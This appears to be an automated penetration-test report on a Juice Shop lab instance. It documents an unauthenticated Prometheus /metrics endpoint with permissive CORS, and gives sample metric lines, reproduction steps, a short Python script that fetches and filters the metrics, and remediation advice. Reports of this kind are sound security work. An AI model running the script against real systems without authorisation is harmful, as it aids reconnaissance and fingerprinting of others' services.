╭─ VULN-0002 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: Unauthenticated Prometheus Metrics Exposure at /metrics              │
│                                                                              │
│  Severity: MEDIUM                                                            │
│                                                                              │
│  CVSS Score: 5.3                                                             │
│                                                                              │
│  Target: http://juiceshop:3000                                               │
│                                                                              │
│  Endpoint: /metrics                                                          │
│                                                                              │
│  Method: GET, OPTIONS                                                        │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N                            │
│                                                                              │
│  Description                                                                 │
│  The application exposes a Prometheus-compatible metrics endpoint at         │
│  `/metrics` that is accessible without authentication. Any unauthenticated   │
│  user can retrieve internal runtime telemetry and application-level          │
│  counters.\n\nThis materially increases the effectiveness of reconnaissance  │
│  by disclosing precise runtime characteristics (e.g., Node.js version,       │
│  process start time, resource usage) and business/operational counters       │
│  (e.g., registered users, orders placed, wallet balance totals). In real     │
│  deployments, similar metrics endpoints commonly expand to include           │
│  additional labels and custom metrics that may inadvertently include         │
│  sensitive data.                                                             │
│                                                                              │
│  Impact                                                                      │
│  Unauthenticated access to detailed metrics may allow an attacker to:\n\n-   │
│  Fingerprint the runtime (e.g., Node.js version) to target known             │
│  vulnerabilities and tailor exploits.\n- Monitor service health and usage    │
│  patterns (uptime/process start time, request counters), improving attack    │
│  timing and stealth.\n- Infer operational/business information (registered   │
│  user counts, orders placed, wallet balance totals) that may be sensitive    │
│  from a business intelligence or compliance perspective.\n\nWhile no direct  │
│  credentials or obvious PII were observed in the sampled metrics output,     │
│  the endpoint provides high-value intelligence that reduces attacker effort  │
│  and can amplify the impact of other vulnerabilities.                        │
│                                                                              │
│  Technical Analysis                                                          │
│  The endpoint `GET /metrics` returns Prometheus text exposition format       │
│  (`text/plain; version=0.0.4`) without requiring a session cookie or         │
│  Authorization header.\n\nExample high-signal lines observed in the          │
│  response include:\n\n-                                                      │
│  `nodejs_version_info{version=\"v22.21.1\",major=\"22\",minor=\"21\",patch=  │
│  \"1\",app=\"juiceshop\"} 1`\n-                                              │
│  `process_start_time_seconds{app=\"juiceshop\"} 1770990295`\n-               │
│  `process_open_fds{app=\"juiceshop\"} 27`\n-                                 │
│  `process_resident_memory_bytes{app=\"juiceshop\"} 247881728`\n-             │
│  `juiceshop_users_registered{type=\"standard\",app=\"juiceshop\"} 13`\n-     │
│  `juiceshop_users_registered_total{app=\"juiceshop\"} 25`\n-                 │
│  `juiceshop_orders_placed_total{app=\"juiceshop\"} 3`\n-                     │
│  `juiceshop_wallet_balance_total{app=\"juiceshop\"} 500`\n\nAdditionally,    │
│  an `OPTIONS /metrics` preflight response indicates permissive cross-origin  │
│  behavior (`Access-Control-Allow-Origin: *`), which increases the            │
│  likelihood that this data can be retrieved in browser contexts depending    │
│  on GET response headers and deployment configuration.                       │
│                                                                              │
│  PoC Description                                                             │
│  To reproduce:\n\n1. Send an unauthenticated request:\n   `GET               │
│  http://juiceshop:3000/metrics`\n\n2. Observe that the server responds with  │
│  `200 OK` and returns Prometheus-formatted metrics without requiring         │
│  authentication.\n\n3. Verify that runtime fingerprinting and operational    │
│  counters are present (e.g., `nodejs_version_info`, `process_*`,             │
│  `juiceshop_users_registered_total`).\n\nOptional (CORS):\n4. Send a         │
│  preflight request:\n   `OPTIONS http://juiceshop:3000/metrics` with an      │
│  `Origin` header, and observe `Access-Control-Allow-Origin: *`.              │
│                                                                              │
│  PoC Code                                                                    │
│  import re\nimport sys\nimport requests\n\nBASE = sys.argv[1] if             │
│  len(sys.argv) > 1 else \"http://juiceshop:3000\"\nURL = BASE.rstrip(\"/\")  │
│  + \"/metrics\"\n\nKEY_PATTERNS = [\n    r\"^nodejs_version_info\\b\",\n     │
│  r\"^process_start_time_seconds\\b\",\n    r\"^process_open_fds\\b\",\n      │
│  r\"^process_resident_memory_bytes\\b\",\n                                   │
│  r\"^http_requests_count\\b\",\n    r\"^juiceshop_users_registered\\b\",\n   │
│  r\"^juiceshop_users_registered_total\\b\",\n                                │
│  r\"^juiceshop_orders_placed_total\\b\",\n                                   │
│  r\"^juiceshop_wallet_balance_total\\b\",\n                                  │
│  r\"^file_uploads_count\\b\",\n    r\"^file_upload_errors\\b\",\n]\n\n\ndef  │
│  main() -> int:\n    r = requests.get(URL, timeout=15)\n    print(f\"GET     │
│  {URL}\")\n    print(f\"Status: {r.status_code}\")\n                         │
│  print(f\"Content-Type: {r.headers.get('Content-Type')}\")\n                 │
│  print(f\"Bytes: {len(r.content)}\")\n    print()\n\n    if r.status_code    │
│  != 200:\n        print(r.text[:500])\n        return 1\n\n    lines =       │
│  r.text.splitlines()\n\n    print(\"Selected high-signal metric lines:\")\n  │
│  compiled = [re.compile(p) for p in KEY_PATTERNS]\n    shown = 0\n    for    │
│  line in lines:\n        if not line or line.startswith(\"#\"):\n            │
│  continue\n        if any(c.search(line) for c in compiled):\n               │
│  print(line)\n            shown += 1\n            if shown >= 40:\n          │
│  break\n\n    if shown == 0:\n        print(\"No matching lines found        │
│  (metrics format may differ).\")\n\n    return 0\n\n\nif __name__ ==         │
│  \"__main__\":\n    raise SystemExit(main())                                 │
│                                                                              │
│  Remediation                                                                 │
│  1. Restrict access to `/metrics` using one or more of the following         │
│  controls:\n\n- Network-layer access controls (IP allowlist, VPN-only        │
│  access, service mesh policy).\n- Application-layer                          │
│  authentication/authorization (e.g., admin-only access).\n\n2. If metrics    │
│  must be exposed publicly, reduce sensitivity:\n\n- Remove business/tenant   │
│  counters not required for external monitoring.\n- Ensure labels never       │
│  include secrets, tokens, emails, or user identifiers.\n- Apply rate         │
│  limiting and monitoring for scraping attempts.\n\n3. Separate health        │
│  checks from detailed metrics:\n\n- Provide a minimal `/health` endpoint     │
│  for uptime checks.\n- Keep detailed Prometheus metrics on an internal-only  │
│  listener or behind an authenticated reverse proxy.                          │
│                                                                              │
